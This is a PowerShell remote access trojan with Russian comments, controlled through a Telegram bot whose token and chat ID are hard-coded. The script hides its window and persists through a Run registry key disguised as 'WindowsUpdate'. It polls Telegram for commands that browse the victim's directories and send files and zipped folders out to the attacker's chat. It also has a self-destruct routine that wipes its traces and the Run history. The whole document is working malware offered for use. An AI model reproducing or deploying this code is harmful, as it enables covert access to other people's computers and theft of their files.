# RAT через Telegram Bot
$Token = "8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs"
$ChatID = "5674514050"

# Настройки скрытности
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Скрытие окна PowerShell
$windowCode = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
$windowAPI = Add-Type -MemberDefinition $windowCode -Name Win32ShowWindowAsync -Namespace Win32Functions -PassThru
$windowAPI::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0) | Out-Null

# Функция отправки сообщений
function Send-Telegram {
    param([string]$Message, [string]$FilePath = $null)
    
    $lastMessage = $global:LastSentMessage
    if ($Message -eq $lastMessage) { return }
    $global:LastSentMessage = $Message
    
    $url = "https://api.telegram.org/bot$Token/sendMessage"
    $body = @{
        chat_id = $ChatID
        text = $Message
        parse_mode = "HTML"
    }
    
    try {
        Invoke-RestMethod -Uri $url -Method Post -Body $body -UseBasicParsing | Out-Null
    } catch { }
    
    if ($FilePath -and (Test-Path $FilePath)) {
        $fileUrl = "https://api.telegram.org/bot$Token/sendDocument"
        $fileBody = @{chat_id = $ChatID; document = Get-Item $FilePath}
        try {
            Invoke-RestMethod -Uri $fileUrl -Method Post -Form $fileBody -UseBasicParsing | Out-Null
        } catch { }
    }
}

# Установка в автозагрузку
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$scriptPath = "$env:TEMP\WindowsUpdate.exe"
if (!(Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
Copy-Item $MyInvocation.MyCommand.Path $scriptPath -Force
Set-ItemProperty -Path $regPath -Name "WindowsUpdate" -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -Force

# Основные переменные
$currentDir = "C:\"
$global:LastSentMessage = ""

# Отправка информации о запуске
Send-Telegram "RAT активирован на $env:COMPUTERNAME`nДоступные команды:`n/help - список команд`n/ls - список файлов`n/cd [папка] - сменить директорию`n/download [файл] - скачать файл`n/selfdestruct - самоуничтожение"

# Основной цикл опроса
while ($true) {
    try {
        $updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot$Token/getUpdates" -Method Get -UseBasicParsing
        if ($updates.ok -and $updates.result.Count -gt 0) {
            $lastUpdate = $updates.result[-1]
            if ($lastUpdate.message.chat.id -eq $ChatID) {
                $command = $lastUpdate.message.text
                $messageId = $lastUpdate.update_id
                
                # Обработка команд
                switch -regex ($command) {
                    "^/help$" {
                        Send-Telegram "Доступные команды:`n/help - показать это сообщение`n/ls - список файлов в текущей директории`n/cd [папка] - сменить директорию`n/download [файл] - скачать файл или папку`n/selfdestruct - самоуничтожение RAT"
                    }
                    "^/ls$" {
                        $files = Get-ChildItem -Path $currentDir -Force | Select-Object Name,Length,LastWriteTime
                        $fileList = @()
                        foreach ($file in $files) {
                            $type = if ($file.PSIsContainer) { "📁" } else { "📄" }
                            $size = if ($file.Length) { " ($([math]::Round($file.Length/1KB,2)) KB)" } else { "" }
                            $fileList += "$type $($file.Name)$size - $($file.LastWriteTime)"
                        }
                        Send-Telegram "Содержимое $currentDir`n$($fileList -join "`n")"
                    }
                    "^/cd (.+)$" {
                        $newDir = $matches[1]
                        if ($newDir -eq "..") {
                            $currentDir = Split-Path $currentDir -Parent
                            if (!$currentDir) { $currentDir = "C:\" }
                        } else {
                            $testPath = Join-Path $currentDir $newDir
                            if (Test-Path $testPath -PathType Container) {
                                $currentDir = $testPath
                            } else {
                                Send-Telegram "Директория не найдена: $newDir"
                            }
                        }
                        Send-Telegram "Текущая директория: $currentDir"
                    }
                    "^/download (.+)$" {
                        $target = $matches[1]
                        $fullPath = Join-Path $currentDir $target
                        if (Test-Path $fullPath) {
                            if (Test-Path $fullPath -PathType Container) {
                                # Архивируем папку
                                $zipPath = "$env:TEMP\$([System.IO.Path]::GetRandomFileName()).zip"
                                Add-Type -Assembly System.IO.Compression.FileSystem
                                [System.IO.Compression.ZipFile]::CreateFromDirectory($fullPath, $zipPath)
                                Send-Telegram "Папка $target заархивирована" $zipPath
                                Remove-Item $zipPath -Force
                            } else {
                                Send-Telegram "Файл $target отправлен" $fullPath
                            }
                        } else {
                            Send-Telegram "Файл/папка не найдены: $target"
                        }
                    }
                    "^/selfdestruct$" {
                        # Очистка истории RUN
                        Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
                        
                        # Удаление из автозагрузки
                        Remove-ItemProperty -Path $regPath -Name "WindowsUpdate" -Force -ErrorAction SilentlyContinue
                        
                        # Удаление файлов
                        if (Test-Path $scriptPath) { Remove-Item $scriptPath -Force }
                        if (Test-Path $MyInvocation.MyCommand.Path) { Remove-Item $MyInvocation.MyCommand.Path -Force }
                        
                        Send-Telegram "RAT самоуничтожен. Все следы удалены."
                        exit
                    }
                }
                
                # Отмечаем сообщение как обработанное
                Invoke-RestMethod -Uri "https://api.telegram.org/bot$Token/getUpdates?offset=$($messageId + 1)" -Method Get -UseBasicParsing | Out-Null
            }
        }
    } catch { }
    Start-Sleep -Seconds 2
}
